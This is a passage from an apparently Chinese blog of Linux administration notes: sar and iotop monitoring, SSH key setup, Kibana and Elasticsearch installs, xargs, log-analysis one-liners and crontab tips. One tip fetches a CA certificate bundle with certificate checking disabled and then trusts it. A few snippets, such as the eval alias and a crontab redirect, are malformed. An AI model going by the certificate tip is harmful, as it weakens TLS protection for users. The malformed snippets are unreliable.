:</span><br><span class="line"></span><br><span class="line">Device : 磁盘名称</span><br><span class="line">tps : 每秒 I/O 传输请求量</span><br><span class="line">Blk_read/s : 每秒读取多少块，查看块大小可参考命令 tune2fs</span><br><span class="line">Blk_wrtn/s : 每秒写取多少块</span><br><span class="line">Blk_read : 一共读了多少块</span><br><span class="line">–Blk_wrtn : 一共写了多少块</span><br><span class="line">五、iotop 命令</span><br><span class="line"></span><br><span class="line">iotop 命令类似于 top 命令，但是显示的是各个进程的 I/O 情况，对于定位 I/O 操作较重的进程有比较大的作用。\</span><br><span class="line"></span><br><span class="line"># iotop\</span><br><span class="line">Total DISK READ: <span class="number">0.00</span> B/s | Total DISK WRITE: <span class="number">774.52</span> K/s\</span><br><span class="line">  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND                                                                \</span><br><span class="line">  <span class="number">272</span> be/<span class="number">3</span> root        <span class="number">0.00</span> B/s    <span class="number">0.00</span> B/s  <span class="number">0.00</span> %  <span class="number">4.86</span> % [jbd2/vda1<span class="number">-8</span>]\</span><br><span class="line"> <span class="number">9072</span> be/<span class="number">4</span> mysql       <span class="number">0.00</span> B/s  <span class="number">268.71</span> K/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % mysqld\</span><br><span class="line"> <span class="number">5058</span> be/<span class="number">4</span> lvinkim     <span class="number">0.00</span> B/s    <span class="number">3.95</span> K/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % php-fpm: pool www\</span><br><span class="line">    <span class="number">1</span> be/<span class="number">4</span> root        <span class="number">0.00</span> B/s    <span class="number">0.00</span> B/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % init</span><br><span class="line">可以看到不同任务的读写强度。</span><br><span class="line"></span><br><span class="line">六、sysstat 工具</span><br><span class="line"></span><br><span class="line">很多时候当检测到或者知道历史的高负载状况时，可能需要回放历史监控数据，这时 sar 命令就派上用场了，sar 命令同样来自 sysstat 工具包，可以记录系统的 CPU 负载、I/O 状况和内存使用记录，便于历史数据的回放。</span><br><span class="line"></span><br><span class="line">sysstat 的配置文件在 /etc/sysconfig/sysstat 文件，历史日志的存放位置为 /<span class="keyword">var</span>/log/sa\</span><br><span class="line">统计信息都是每 <span class="number">10</span> 分钟记录一次，每天的 <span class="number">23</span>:<span class="number">59</span> 会分割统计文件，这些操作的频率都在 /etc/cron.d/sysstat 文件配置。\</span><br><span class="line"></span><br><span class="line">七、sar 命令</span><br><span class="line"></span><br><span class="line">使用 sar 命令查看当天 CPU 使用：</span><br><span class="line"></span><br><span class="line">$ sar\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM     CPU     %user     %nice   %system   %iowait    %steal     %idle\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM     all      <span class="number">0.45</span>      <span class="number">0.00</span>      <span class="number">0.22</span>      <span class="number">0.40</span>      <span class="number">0.00</span>     <span class="number">98.93</span>\</span><br><span class="line">Average:        all      <span class="number">0.45</span>      <span class="number">0.00</span>      <span class="number">0.22</span>      <span class="number">0.40</span>      <span class="number">0.00</span>     <span class="number">98.93</span></span><br><span class="line">使用 sar 命令查看当天内存使用：</span><br><span class="line"></span><br><span class="line">$ sar -r\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM     <span class="number">41292</span>    <span class="number">459180</span>     <span class="number">91.75</span>     <span class="number">44072</span>    <span class="number">164620</span>    <span class="number">822392</span>    <span class="number">164.32</span>\</span><br><span class="line">Average:        <span class="number">41292</span>    <span class="number">459180</span>     <span class="number">91.75</span>     <span class="number">44072</span>    <span class="number">164620</span>    <span class="number">822392</span>    <span class="number">164.32</span></span><br><span class="line">使用 sar 命令查看当天 IO 统计记录：</span><br><span class="line"></span><br><span class="line">$ sar -b\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM       tps      rtps      wtps   bread/s   bwrtn/s\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM      <span class="number">3.31</span>      <span class="number">2.14</span>      <span class="number">1.17</span>     <span class="number">37.18</span>     <span class="number">16.84</span>\</span><br><span class="line">Average:         <span class="number">3.31</span>      <span class="number">2.14</span>      <span class="number">1.17</span>     <span class="number">37.18</span>     <span class="number">16.84</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/31718</span></span><br></pre></td></tr></table></figure>
<h3 id="秘钥登录"><a href="#秘钥登录" class="headerlink" title="秘钥登录"></a>秘钥登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">'youxiang@aliyun.com'</span></span><br><span class="line">scp -P &lt;端口号&gt; ~<span class="regexp">/.ssh/i</span>d_rsa.pub &lt;用户名&gt;@&lt;ip地址&gt;:<span class="regexp">/home/i</span>d_rsa.pub</span><br><span class="line">cat /home/id_rsa.pub &gt;&gt; ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line"></span><br><span class="line">如果在 家目录 没有 .ssh 目录或 authorized_keys 文件，可以创建一下，并授予 authorized_keys 文件 <span class="number">600</span> 权限</span><br><span class="line">ssh root@<span class="number">114.11</span><span class="number">.11</span><span class="number">.111</span></span><br><span class="line">vi ~<span class="regexp">/.ssh/</span>config</span><br><span class="line"></span><br><span class="line">Host            jd            #自定义别名</span><br><span class="line">HostName        114.11.11.110         #替换为你的ssh服务器ip或domain</span><br><span class="line">Port            22             #ssh服务器端口，默认为22</span><br><span class="line">User            root             #ssh服务器用户名</span><br><span class="line">IdentityFile    ~/.ssh/id_rsa    #第一个步骤生成的公钥文件对应的私钥文件</span><br><span class="line">此时就可以使用 ssh jd 进行登录</span><br><span class="line">cd /etc/ssh/</span><br><span class="line"></span><br><span class="line">修改 SSH 的配置文件 vi sshd_config</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandRunAs nobody</span><br><span class="line"></span><br><span class="line">#默认PasswordAuthentication 为yes,即允许密码登录，改为no后，禁止密码登录</span><br><span class="line">PasswordAuthentication no </span><br><span class="line">重启 ssh 服务</span><br><span class="line"></span><br><span class="line">systemctl restart sshd.service</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30438</span></span><br></pre></td></tr></table></figure>
<h3 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">第一种方法： qrencode</span><br><span class="line">#安装，记得加epel yum源</span><br><span class="line">[root@localhost ~]# yum install libpng libpng-devel qrencode -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#格式</span><br><span class="line">Usage: qrencode [OPTION]... [STRING]</span><br><span class="line">OPTIONS：</span><br><span class="line">-o：输出的二维码文件名。如test.png。需要以.png结尾。-表示输出到控制台。</span><br><span class="line">-s：指定图片大小。默认为<span class="number">3</span>个像素。</span><br><span class="line">-t：指定产生的图片类型。默认为PNG。可以是PNG/ANSI/ANSI256/ASCIIi/UTF8等。如果需要输出到控制台，可以用ANSI、ANSI256等</span><br><span class="line">STRING：可以是text、url等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#使用</span><br><span class="line">注：输出的二维码图片大小取决于，内容的多少，且不能换行</span><br><span class="line"></span><br><span class="line"># 将“http://jinchuang.org”网址转换为二维码并保存在qrcode.png图片中</span><br><span class="line">[root@localhost ~]# qrencode -o qrcode.png "http://jinchuang.org"</span><br><span class="line"></span><br><span class="line"># 在终端下无法查看png图片，所以可以使用ANSI生成</span><br><span class="line">[root@localhost ~]# echo "your input words" | qrencode -o - -t ANSI</span><br><span class="line"></span><br><span class="line"># 也可以将需要转换的文字保存为xx.txt文件，之后再转换</span><br><span class="line">[root@localhost ~]# cat xx.txt | qrencode -o - -t ANSI</span><br><span class="line"></span><br><span class="line">第二种方法：</span><br><span class="line">[root@localhost ~]# printf "http://jinchuang.org" | curl -F-=\&lt;- qrenco.de</span><br></pre></td></tr></table></figure>
<h3 id="es-Kibana"><a href="#es-Kibana" class="headerlink" title="es Kibana"></a>es Kibana</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]# cd /source</span><br><span class="line">[root@localhost source]# wget https://artifacts.elastic.co/downloads/kibana/kibana-5.6.0-linux-x86_64.tar.gz</span><br><span class="line">[root@localhost source]# tar xf kibana-5.6.0-linux-x86_64.tar.gz  -C /elk/</span><br><span class="line">[root@localhost source]# cd /elk/</span><br><span class="line">[root@localhost elk]# mv kibana-5.6.0-linux-x86_64/ kibana</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">[root@localhost elk]# vim kibana/config/kibana.yml</span><br><span class="line">server.port: <span class="number">5601</span></span><br><span class="line">server.host: <span class="string">"0.0.0.0"</span></span><br><span class="line">elasticsearch.url: <span class="string">"http://127.0.0.1:9200"</span></span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">[root@localhost elk]# /elk/kibana/bin/kibana &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">31948</span></span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.064</span>] [info][status][plugin:kibana@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.149</span>] [info][status][plugin:elasticsearch@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to yellow - Waiting <span class="keyword">for</span> Elasticsearch</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.190</span>] [info][status][plugin:<span class="built_in">console</span>@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.235</span>] [info][status][plugin:metrics@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.435</span>] [info][status][plugin:timelion@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.447</span>] [info][status][plugin:elasticsearch@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> yellow to green - Kibana index ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.449</span>] [info][listening] Server running at http:<span class="comment">//0.0.0.0:5601</span></span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.452</span>] [info][status][ui settings] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line"></span><br><span class="line">#查看进程和端口</span><br><span class="line">[root@localhost elk]# ps -ef|grep kibana</span><br><span class="line">root     <span class="number">31948</span> <span class="number">31038</span> <span class="number">12</span> <span class="number">13</span>:<span class="number">52</span> pts/<span class="number">3</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">04</span> /elk/kibana/bin/../node/bin/node --no-warnings /elk/kibana/bin/../src/cli</span><br><span class="line"></span><br><span class="line">[root@localhost elk]# netstat -lntp </span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9100</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">28361</span>/grunt         </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">14146</span>/sshd      </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/319.html</span></span><br></pre></td></tr></table></figure>
<h3 id="随机数生成"><a href="#随机数生成" class="headerlink" title="随机数生成"></a>随机数生成</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)  echo $(($RANDOM))          通过系统环境变量</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)  echo $RANDOM | md5sum|cut -c <span class="number">1</span><span class="number">-8</span></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)  openssl rand -base64 <span class="number">65</span>         openssl产生随机数</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)  date +%s%N          通过时间获取随机数</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)  head /dev/urandom |cksum            设备随机数</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)  cat /proc/sys/kernel/random/uuid           uuid随机数</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)  mkpasswd -l <span class="number">12</span> -d <span class="number">5</span>             expect随机数，需要安装expect</span><br></pre></td></tr></table></figure>
<h3 id="Elasticsearch-在-docker-和-CentOS-下的安装教程"><a href="#Elasticsearch-在-docker-和-CentOS-下的安装教程" class="headerlink" title="Elasticsearch 在 docker 和 CentOS 下的安装教程"></a>Elasticsearch 在 docker 和 CentOS 下的安装教程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">sudo docker run -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> -e <span class="string">"discovery.type=single-node"</span> docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">sudo docker run -itd -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> -e <span class="string">"discovery.type=single-node"</span> docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/33404</span></span><br></pre></td></tr></table></figure>
<h3 id="wget-命令提示-“use-‘–no-check-certificate"><a href="#wget-命令提示-“use-‘–no-check-certificate" class="headerlink" title="wget 命令提示 “use ‘–no-check-certificate"></a>wget 命令提示 “use ‘–no-check-certificate</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"print_r(openssl_get_cert_locations());"</span></span><br><span class="line">可以看到证书的默认位置在 /etc/pki/tls/cert.pem，这是在安装 Apache 时自动生成的证书文件。如果你的目录里没有证书文件，使用下面的命令下载一个：</span><br><span class="line"></span><br><span class="line">$wget -c https:<span class="comment">//curl.haxx.se/ca/cacert.pem  /tmp --no-check-certificate</span></span><br><span class="line">因为我系统上本来就有一个证书文件了，为了不影响原来的，我将新的证书文件下载到 /tmp 目录中。然后设置以下环境变量，使证书只在当前会话生效：</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> SSL_CERT_FILE=<span class="regexp">/tmp/</span>cacert.pem</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33549</span></span><br></pre></td></tr></table></figure>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果我们想在一台电脑上搭建各种开发环境：lnmp 环境，java 环境，nodejs，redis 集群，python 开发环境。显然，这些多的开发环境，如果集中在一台机器上构建，会让系统显得复杂，可能还会出现各种版本或依赖之间的不兼容。如果能将这些开发环境都独立开来，各个环境互相独立隔离，但又能互相通讯交互，相当于每个环境都是一个容器，这些容器可以独立提供服务，也能通信交互。</span><br><span class="line"></span><br><span class="line">docker 就是这样的容器技术。</span><br><span class="line"></span><br><span class="line">用官方术语描述 docker: Docker 是基于 Go 语言实现的开源容器项目，有效地将由单个操作系统管理的资源划分到孤立的组中，以更好地在孤立的组之间平衡有冲突的资源使用需求。</span><br><span class="line"></span><br><span class="line">通俗地理解：docker 能让你在一台物理机上构建出很多个轻量极的开发环境。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33670#reply108346</span></span><br></pre></td></tr></table></figure>
<h3 id="xargs-命令"><a href="#xargs-命令" class="headerlink" title="xargs 命令"></a>xargs 命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">echo命令就不接受管道传参。</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">"hello world"</span> | echo</span><br><span class="line">xargs命令的作用，是将标准输入转为命令行参数</span><br><span class="line">$ echo <span class="string">"hello world"</span> | xargs echo</span><br><span class="line">hello world</span><br><span class="line">$ echo <span class="string">"one two three"</span> | xargs mkdir</span><br><span class="line"></span><br><span class="line">$ xargs</span><br><span class="line"># 等同于</span><br><span class="line">$ xargs echo</span><br><span class="line">-d参数可以更改分隔符。</span><br><span class="line"></span><br><span class="line">$ echo -e <span class="string">"a\tb\tc"</span> | xargs -d <span class="string">"\t"</span> echo</span><br><span class="line">a b c</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">'one two three'</span> | xargs -p touch</span><br><span class="line">touch one two three ?...</span><br><span class="line">上面的命令执行以后，会打印出最终要执行的命令，让用户确认。用户输入y以后（大小写皆可），才会真正执行。</span><br><span class="line">xargs特别适合find命令。有些命令（比如rm）一旦参数过多会报错<span class="string">"参数列表过长"</span>，而无法执行，改用xargs就没有这个问题，因为它对每个参数执行一次命令。</span><br><span class="line"></span><br><span class="line">$ find . -name <span class="string">"*.txt"</span> | xargs grep <span class="string">"abc"</span></span><br><span class="line">上面命令找出所有 TXT 文件以后，对每个文件搜索一次是否包含字符串abc</span><br><span class="line">http:<span class="comment">//www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html</span></span><br></pre></td></tr></table></figure>
<h3 id="禁用-eval-函数"><a href="#禁用-eval-函数" class="headerlink" title="禁用 eval 函数"></a>禁用 eval 函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在 /etc/bashrc 里加入</span><br><span class="line">alias <span class="built_in">eval</span> = <span class="string">'echo'</span></span><br></pre></td></tr></table></figure>
<h3 id="find-模拟-tree"><a href="#find-模拟-tree" class="headerlink" title="find 模拟 tree"></a>find 模拟 tree</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . -print | sed -e <span class="string">``</span><span class="string">'s;[^/]*/;|____;g;s;____|; |;g'</span></span><br></pre></td></tr></table></figure>
<h3 id="Shell-命令组合"><a href="#Shell-命令组合" class="headerlink" title="Shell 命令组合"></a>Shell 命令组合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">统计独立 IP 数量 awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq | wc -l</span><br><span class="line">查看某一时间段的 IP 访问量 grep <span class="string">"05/Apr/2019:0[1-9]"</span> access.log | awk <span class="string">'&#123;print $1&#125;'</span> | sort | uniq -c| sort -nr | wc -l</span><br><span class="line">查看访问最频繁的前 <span class="number">100</span> 个 IP awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq -c | sort -rn | head -n <span class="number">100</span></span><br><span class="line">访问 <span class="number">100</span> 次以上的 IP awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq -c | awk <span class="string">'&#123;if($1 &gt; 100) print $0&#125;'</span> | sort -rn</span><br><span class="line">查询某个 IP 的详细访问情况，按访问频率排序 grep <span class="string">'127.0.0.1'</span> access.log | awk <span class="string">'&#123;print $7&#125;'</span> | sort | uniq -c | sort -rn | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure>
<h3 id="Crontab-定时任务执行时的环境变量问题"><a href="#Crontab-定时任务执行时的环境变量问题" class="headerlink" title="Crontab 定时任务执行时的环境变量问题"></a>Crontab 定时任务执行时的环境变量问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">不是在 root 用户下安装的 scrapy，是在 crawl 用户下，然后一开始没注意，应该是用 root 用户配置的定时任务，导致定时任务找不到 scrapy，这个可以理解。但是当我在 crawl 用户下，重新配置了爬虫，发现还是报同样的错误。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">crontab -l  # 通过这个命令，可以查看当前用户下的定时任务</span><br><span class="line">解决办法</span><br><span class="line"></span><br><span class="line">后来经过查阅得知，crontab 有自己的环境变量配置，在 /etc/crontab 文件中，并不会自动加载当前用户的环境变量。所以在执行命令之前，应该先配置好环境变量。</span><br><span class="line"></span><br><span class="line">所以在 crontab 用户下，执行命令前先载入环境变量，如下。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="number">00</span> <span class="number">10</span> * * * source $HOME/.bash_profile &amp;&amp; $HOME/path/to/script;sh /home/crawl/exec_aqi.sh &amp;  &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;</span><br><span class="line">如果直接修改 /etc/crontab 文件</span><br><span class="line">SHELL=<span class="regexp">/bin/</span>bash</span><br><span class="line">PATH=<span class="regexp">/sbin:/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>bin</span><br><span class="line">MAILTO=root</span><br><span class="line"><span class="number">00</span> <span class="number">10</span> * * * crawl sh /home/crawl/exec_aqi.sh &amp;</span><br><span class="line">https:<span class="comment">//zcdll.github.io/2018/01/30/own-crontab/</span></span><br></pre></td></tr></table></figure>
<h3 id="终端技巧大集合"><a href="#终端技巧大集合" class="headerlink" title="终端技巧大集合"></a>终端技巧大集合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># ‘&#123;&#125;’ 可用于匹配多个模式的文件名 </span><br><span class="line">ls &#123;*.sh,*.py&#125;   #列出所有.sh和.py文件</span><br><span class="line">筛选匹配前后返回的行（例如 “bbo”）</span><br><span class="line"></span><br><span class="line"># return also 3 lines after match</span><br><span class="line">grep -A <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line"></span><br><span class="line"># return also 3 lines before match</span><br><span class="line">grep -B <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line"></span><br><span class="line"># return also 3 lines before and after match</span><br><span class="line">grep -C <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line">删除前 <span class="number">100</span> 行（删除第 <span class="number">1</span><span class="number">-100</span> 行）</span><br><span class="line"></span><br><span class="line">sed <span class="number">1</span>,<span class="number">100</span>d filename</span><br><span class="line">删除带字符串的行 (例如： bbo)</span><br><span class="line"></span><br><span class="line">sed <span class="string">"/bbo/d"</span> filename</span><br><span class="line">- <span class="keyword">case</span> insensitive:</span><br><span class="line">sed <span class="string">"/bbo/Id"</span> filename</span><br><span class="line">删除空行</span><br><span class="line"></span><br><span class="line">sed <span class="string">'/^\s*$/d'</span></span><br><span class="line"></span><br><span class="line"># 或</span><br><span class="line"></span><br><span class="line">sed <span class="string">'/^$/d'</span></span><br><span class="line">查找且删除</span><br><span class="line"></span><br><span class="line">find . -name <span class="string">"*.html"</span>|xargs rm</span><br><span class="line"></span><br><span class="line"># when using a backtick</span><br><span class="line">rm <span class="string">`find . -name "*.html"`</span></span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/35317#replies</span></span><br></pre></td></tr></table></figure>
